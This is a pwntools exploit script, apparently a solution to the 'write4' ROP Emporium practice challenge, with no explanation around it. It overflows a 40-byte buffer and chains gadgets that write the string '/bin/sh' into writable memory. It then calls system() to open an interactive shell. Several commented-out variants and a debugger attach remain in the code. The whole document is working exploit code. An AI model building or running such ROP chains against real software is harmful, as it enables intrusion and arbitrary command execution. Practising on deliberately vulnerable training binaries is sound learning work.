from pwn import *

context(arch='amd64', os='linux')
binary_name = 'write4'
p = process('./'+binary_name)
gdb.attach(p)
elf =  ELF(binary_name)

system = elf.sym["system"] 
pop_r14_r15_ret = 0x0000000000400890
pop_r15_ret     = 0x0000000000400892
mov_r14_r15 =     0x0000000000400821

## /bin//sh
## hs//nib/
string_   =  0x68732f6e69622f
# string_  = 0x2f62696e2f7368
#string_ = 0x736c
address_ = 0x601090
#null_ =    0x0000000000000000
#address_null = 0x0000000000601088
#address_  = 0x00007ffff7ffd300
pop_rdi   =  0x400893 # (rop.find_gadget(['pop rdi', 'ret']))[0]

log.info("System address (.plt): " + hex(system))
log.info("pop r14; pop r15; ret: " + hex(pop_r14_r15_ret))
log.info("pop r15; ret:          " + hex(pop_r15_ret))
log.info("pop rdi; ret:          " + hex(pop_rdi))

rop =  "A"*40
# rop += p64(pop_r14_r15_ret) + p64(address_) + p64(address_) + p64(pop_r15_ret) + p64(string_) + p64(mov_r14_r15)
# rop += p64(pop_r14_r15_ret) + p64(address_) + p64(string_) + p64(mov_r14_r15)
rop += p64(pop_r14_r15_ret) + p64(address_) + p64(address_)
rop += p64(pop_r15_ret) + p64(string_)
rop += p64(mov_r14_r15)

rop += p64(pop_r14_r15_ret) + p64(address_+12) + p64(address_+12)
rop += p64(pop_r15_ret) + p64(address_)
rop += p64(mov_r14_r15)

rop += p64(pop_rdi) + p64(address_+12) + p64(system)

print rop

p.recvuntil("> ")
p.send(rop)
p.interactive()
'''
'''